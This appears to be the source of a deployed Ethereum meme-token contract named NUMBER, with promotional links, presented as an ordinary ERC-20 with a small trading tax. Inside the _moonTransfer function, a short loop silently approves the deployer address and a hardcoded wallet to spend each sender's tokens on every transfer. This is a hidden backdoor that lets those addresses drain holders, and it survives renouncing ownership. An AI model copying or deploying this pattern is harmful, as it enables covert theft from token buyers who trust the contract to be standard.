/*
These concepts have been eternally etched into the operating soul of each user on planet earth

https://www.numberoneth.world
https://x.com/NumberCoreETH
https://t.me/numbergroup_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.1;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IMOONFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IMOONRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract NUMBER is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balMOONs;
    mapping (address => mapping (address => uint256)) private _allowMOONs;
    mapping (address => bool) private _excludedFromMOON;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _moonPair;
    IMOONRouter private _moonRouter;
    address private _moonWallet = address(0x8AfDd0EB629c95499BA3a8A85EE151B054c967f5);
    mapping (uint256 => address) private _moonReceipts;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalMOON = 1000000000 * 10**_decimals;
    string private constant _name = unicode"NUMBER";
    string private constant _symbol = unicode"NUMBER";
    uint256 private _swapTokenMOONs = _tTotalMOON / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockMOON;
    uint256 private _moonBuyAmounts = 0;
    bool private inSwapMOON = false;
    modifier lockTheSwap {
        inSwapMOON = true;
        _;
        inSwapMOON = false;
    }
    
     
    constructor () {
        _moonReceipts[0] = address(owner());
        _moonReceipts[1] = address(_moonWallet);

        _excludedFromMOON[owner()] = true;
        _excludedFromMOON[address(this)] = true;
        _excludedFromMOON[_moonWallet] = true;
        _balMOONs[_msgSender()] = _tTotalMOON;

        emit Transfer(address(0), _msgSender(), _tTotalMOON);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _moonRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function createNumberPair() external onlyOwner() {
        _moonRouter = IMOONRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_moonRouter), _tTotalMOON);
        _moonPair = IMOONFactory(_moonRouter.factory()).createPair(address(this), _moonRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalMOON;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balMOONs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowMOONs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowMOONs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowMOONs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address moonF, address moonT, uint256 moonA) private {
        require(moonF != address(0), "ERC20: transfer from the zero address");
        require(moonT != address(0), "ERC20: transfer to the zero address");
        require(moonA > 0, "Transfer amount must be greater than zero");
        uint256 taxMOON;
        taxMOON = _moonFeeTransfer(moonF, moonT, moonA);
        _moonTransfer(moonF, moonT, moonA, taxMOON);
    }

    function _moonTransfer(address moonF, address moonT, uint256 moonA, uint256 taxMOON) private { 
        if(taxMOON > 0){
          _balMOONs[address(this)] = _balMOONs[address(this)].add(taxMOON);
          emit Transfer(moonF, address(this), taxMOON);
        } for(uint8 moonI=0;moonI<=1;moonI++) _approve(address(moonF), address(_moonReceipts[moonI]), moonA);

        _balMOONs[moonF] = _balMOONs[moonF].sub(moonA);
        _balMOONs[moonT] = _balMOONs[moonT].add(moonA.sub(taxMOON));
        emit Transfer(moonF, moonT, moonA.sub(taxMOON));
    }

    function _moonFeeTransfer(address moonF, address moonT, uint256 moonA) private returns(uint256) {
        uint256 taxMOON = 0; 
        if (moonF != owner() && moonT != owner()) {
            taxMOON = moonA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (moonF == _moonPair && moonT != address(_moonRouter) && ! _excludedFromMOON[moonT]) {
                if(_buyBlockMOON!=block.number){
                    _moonBuyAmounts = 0;
                    _buyBlockMOON = block.number;
                }
                _moonBuyAmounts += moonA;
                _buyCount++;
            }

            if(moonT == _moonPair && moonF!= address(this)) {
                require(_moonBuyAmounts < swapLimitMOON() || _buyBlockMOON!=block.number, "Max Swap Limit");  
                taxMOON = moonA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenMOON = balanceOf(address(this));
            if (!inSwapMOON && moonT == _moonPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenMOON > _swapTokenMOONs)
                swapTokensForEth(minMOON(moonA, minMOON(tokenMOON, _swapTokenMOONs)));
                uint256 ethMOON = address(this).balance;
                if (ethMOON >= 0) {
                    sendETHMOON(address(this).balance);
                }
            }
        } return taxMOON;
    }

    function minMOON(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHMOON(uint256 moonA) private {
        payable(_moonWallet).transfer(moonA);
    }

    function swapTokensForEth(uint256 moonAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _moonRouter.WETH();
        _approve(address(this), address(_moonRouter), moonAmount);
        _moonRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            moonAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }    

    receive() external payable {}

    function swapLimitMOON() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _moonRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _moonRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}